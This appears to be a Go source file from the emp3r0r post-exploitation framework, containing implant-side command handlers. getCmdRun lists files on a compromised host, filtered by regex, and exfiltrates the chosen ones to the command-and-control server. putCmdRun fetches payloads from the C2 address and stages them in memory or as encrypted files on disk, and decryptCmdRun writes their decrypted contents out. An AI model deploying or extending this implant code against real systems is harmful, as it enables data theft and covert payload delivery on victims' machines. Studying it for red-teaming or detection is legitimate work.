package handler

import (
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)

// getCmdRun downloads a file or lists directory files for download.
func getCmdRun(cmd *cobra.Command, args []string) {
	filePath, _ := cmd.Flags().GetString("file_path")
	filter, _ := cmd.Flags().GetString("filter")
	offset, _ := cmd.Flags().GetInt64("offset")
	token, _ := cmd.Flags().GetString("token")

	if filePath == "" || offset < 0 || token == "" {
		c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("args error: %v", args))
		return
	}
	// If directory, walk and list files.
	if util.IsDirExist(filePath) {
		var re *regexp.Regexp
		var err error
		if filter != "" {
			re, err = regexp.Compile(filter)
			if err != nil {
				c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("Invalid regex: %v", err))
				return
			}
		}
		fileList := []string{}
		err = filepath.Walk(filePath, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}
			if !info.IsDir() {
				if re != nil && !re.MatchString(info.Name()) {
					return nil
				}
				fileList = append(fileList, path)
			}
			return nil
		})
		if err != nil || len(fileList) == 0 {
			c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("Error: %v", err))
			return
		}
		c2transport.NotifyC2(cmd, "%s", strings.Join(fileList, "\n"))
		return
	}

	// Single file: send file via existing helper.
	err := c2transport.SendFile2CC(filePath, offset, token)
	if err != nil {
		c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("Error: failed to send file %s: %v", filePath, err))
		return
	}
	c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("Success: %s has been sent", filePath))
}

// putCmdRun receives a file from CC and saves it locally.
func putCmdRun(cmd *cobra.Command, args []string) {
	fileName, _ := cmd.Flags().GetString("file")
	destPath, _ := cmd.Flags().GetString("path")
	size, _ := cmd.Flags().GetInt64("size")
	origChecksum, _ := cmd.Flags().GetString("checksum")
	downloadAddr, _ := cmd.Flags().GetString("addr")
	// saveToMem flag is deprecated in logic, we infer from path or default to auto
	// saveToMem, _ := cmd.Flags().GetBool("mem")
	force, _ := cmd.Flags().GetBool("force")

	if fileName == "" || destPath == "" || size == 0 {
		c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("args error: %v", args))
		return
	}

	// Download to memory buffer first
	logging.Printf("putCmdRun: downloading %s to memory buffer", fileName)
	data, err := c2transport.FetchFile(downloadAddr, fileName, "", origChecksum)
	if err != nil {
		c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("put: failed to download to memory buffer %s: %v", fileName, err))
		return
	}

	// Try to save with Auto strategy (defaults to memory if small enough)
	// If path implies memory (mem://), it will enforce memory.
	err = util.SaveFileAgent(destPath, data, 0o600, util.StorageAuto)
	if err != nil {
		// Failed (likely Auto tried memory and failed, or disk failed)
		// We only retry to Disk if --force is present AND the initial attempt wasn't explicitly mem://
		if strings.HasPrefix(destPath, "mem://") {
			c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("put: failed to save to memory %s: %v", destPath, err))
			return
		}

		if !force {
			c2transport.NotifyC2(cmd, "Error: Memory unavailable and --force not specified. File not saved.\nUse --force to write to disk (encrypted).")
			return
		}

		// Force disk
		err = util.SaveFileAgent(destPath, data, 0o600, util.StorageDisk)
		if err != nil {
			c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("put: failed to force save to disk %s: %v", destPath, err))
			return
		}
	}

	// Success
	msg := fmt.Sprintf("%s uploaded, sha256sum: %s", destPath, origChecksum)

	// Check where it went
	if util.IsFileExist(destPath) {
		// Check if it's in memory map
		isMem := false
		util.MemFileLock.RLock()
		_, isMem = util.MemFileMap[destPath]
		util.MemFileLock.RUnlock()

		if isMem {
			msg += fmt.Sprintf("\n\nFile saved to memory: %s. Use `decrypt` to save to disk.", destPath)
		} else {
			msg += "\n\nFile saved to DISK (encrypted)."
		}
	}

	c2transport.NotifyC2(cmd, "%s", msg)
}

// decryptCmdRun decrypts a file on agent and writes to disk
func decryptCmdRun(cmd *cobra.Command, args []string) {
	path, _ := cmd.Flags().GetString("path")
	out, _ := cmd.Flags().GetString("out")

	if path == "" {
		c2transport.NotifyC2(cmd, "args error: path is required")
		return
	}
	if out == "" {
		out = path + ".dec"
		c2transport.NotifyC2(cmd, "Output path not specified, using: %s", out)
	}

	logging.Printf("Decrypting %s to %s", path, out)
	data, err := util.ReadFileAgent(path)
	if err != nil {
		c2transport.NotifyC2(cmd, "Read error: %v", err)
		return
	}

	// Write plaintext directly to disk (bypassing WriteFileAgent/encryption)
	err = os.WriteFile(out, data, 0600)
	if err != nil {
		c2transport.NotifyC2(cmd, "Write error: %v", err)
		return
	}
	c2transport.NotifyC2(cmd, "Decrypted %s to %s", path, out)
}
